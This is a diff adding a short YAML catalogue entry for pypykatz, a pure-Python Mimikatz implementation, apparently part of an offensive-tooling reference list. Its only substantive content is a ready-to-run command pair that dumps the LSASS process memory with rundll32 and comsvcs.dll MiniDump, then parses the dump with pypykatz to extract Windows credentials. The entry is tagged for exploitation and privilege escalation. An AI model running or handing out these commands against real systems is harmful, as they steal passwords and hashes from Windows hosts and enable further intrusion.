@@ -1,0 +1,15 @@
+name: pypykatz
+description: Mimikatz implementation in pure Python
+commands:
+  - command: |
+      rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+      pypykatz lsa minidump lsass.dmp
+    description: Dump lsass process (PID 672) and parse it with pypykatz.
+tags:
+  - exploitation
+  - privilege-escalation
+show:
+links:
+  -
+references:
+  - https://github.com/skelsec/pypykatz
